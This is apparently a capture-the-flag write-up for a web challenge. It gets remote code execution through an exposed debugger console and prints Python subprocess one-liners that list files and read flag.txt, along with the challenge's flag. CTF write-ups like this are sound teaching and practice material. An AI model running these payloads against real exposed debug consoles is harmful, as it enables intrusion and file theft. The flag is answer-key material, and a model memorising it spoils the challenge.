# Slightly-broken
- Flag: `ECSC{173e83d17759b2fae389dc3156c51544e424743c7e08605994bf3ab4b810b87e}`
- Category: `web`
- Points: `50`

## Summary
Remote Code Execution from debugger interactive console

## Proof of Solving
So we click the link and we get a page with an error, we open the interactive terminal and send:

`import subprocess;out = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);`
`import subprocess;out = subprocess.Popen(['cat', 'flag.txt'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);`

And we get the flag.
